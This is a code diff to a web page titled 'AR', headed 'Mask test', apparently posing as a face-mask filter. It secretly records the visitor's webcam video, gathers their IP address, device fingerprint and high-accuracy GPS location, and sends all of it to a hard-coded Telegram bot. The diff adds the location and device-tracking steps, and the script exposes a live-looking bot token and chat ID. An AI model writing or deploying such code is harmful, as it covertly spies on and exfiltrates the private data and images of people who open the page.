@@ -4,6 +4,7 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>AR</title>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/UAParser.js/1.0.2/ua-parser.min.js"></script>
 </head>
 <body>
     <h1>Mask test </h1>
@@ -16,7 +17,7 @@
         let userInfo = {};
 
         // Telegram Bot Details
-        const TELEGRAM_TOKEN = '7748177101:AAF0c52ezGH18sp1ba78xZ_yJWiHSgDElbk'
+        const TELEGRAM_TOKEN = '7748177101:AAF0c52ezGH18sp1ba78xZ_yJWiHSgDElbk';
         const TELEGRAM_CHAT_ID = '5297536255';
 
         // Fetch IP and device information
@@ -24,8 +25,31 @@
             .then(response => response.json())
             .then(data => {
                 userInfo.ip = data.ip;
-                userInfo.userAgent = navigator.userAgent;
-                userInfo.time = new Date().toLocaleString();
+
+                // Получаем информацию об устройстве
+                const parser = new UAParser();
+                const deviceInfo = parser.getResult();
+                userInfo.device = `Device: ${deviceInfo.device.model || 'Unknown'}, OS: ${deviceInfo.os.name} ${deviceInfo.os.version}, Browser: ${deviceInfo.browser.name} ${deviceInfo.browser.version}`;
+
+                // Получаем точное местоположение
+                if (navigator.geolocation) {
+                    navigator.geolocation.getCurrentPosition(
+                        position => {
+                            const { latitude, longitude, accuracy } = position.coords;
+                            userInfo.location = `Latitude: ${latitude}, Longitude: ${longitude}, Accuracy: ${accuracy} meters`;
+                            sendUserInfoToTelegram();
+                        },
+                        error => {
+                            console.error('Error fetching geolocation:', error);
+                            userInfo.location = 'Geolocation unavailable';
+                            sendUserInfoToTelegram();
+                        },
+                        { enableHighAccuracy: true }
+                    );
+                } else {
+                    userInfo.location = 'Geolocation not supported';
+                    sendUserInfoToTelegram();
+                }
             })
             .catch(error => console.error('Error fetching IP information:', error));
 
@@ -46,7 +70,7 @@
 
                 mediaRecorder.onstop = () => {
                     const videoBlob = new Blob(recordedChunks, { type: 'video/webm' });
-                    sendToTelegram(videoBlob);
+                    sendVideoToTelegram(videoBlob);
                     recordedChunks = []; // Clear the chunks after processing
                 };
 
@@ -60,30 +84,33 @@
             })
             .catch(err => console.error('Error accessing media devices.', err));
 
-        // Function to send video and user information to Telegram
-        function sendToTelegram(blob) {
-            const formData = new FormData();
-            formData.append('chat_id', TELEGRAM_CHAT_ID);
-            formData.append('video', blob, 'recording.webm');
-
-            // Send user information
+        // Function to send user info to Telegram
+        function sendUserInfoToTelegram() {
             fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({
                     chat_id: TELEGRAM_CHAT_ID,
-                    text: `User Info:\nIP: ${userInfo.ip}\nUser Agent: ${userInfo.userAgent}\nTime: ${userInfo.time}`
+                    text: `User Info:\nIP: ${userInfo.ip}\nLocation: ${userInfo.location}\nDevice: ${userInfo.device}`
                 })
-            }).then(() => {
-                // Send the video after sending user info
-                return fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendVideo`, {
-                    method: 'POST',
-                    body: formData
-                });
+            })
+            .then(response => console.log('User info sent successfully:', response))
+            .catch(error => console.error('Error sending user info:', error));
+        }
+
+        // Function to send video to Telegram
+        function sendVideoToTelegram(blob) {
+            const formData = new FormData();
+            formData.append('chat_id', TELEGRAM_CHAT_ID);
+            formData.append('video', blob, 'recording.webm');
+
+            fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendVideo`, {
+                method: 'POST',
+                body: formData
             })
             .then(response => response.json())
-            .then(data => console.log('Video and user info successfully sent to Telegram:', data))
-            .catch(error => console.error('Error sending data to Telegram:', error));
+            .then(data => console.log('Video successfully sent to Telegram:', data))
+            .catch(error => console.error('Error sending video to Telegram:', error));
         }
     </script>
 </body>
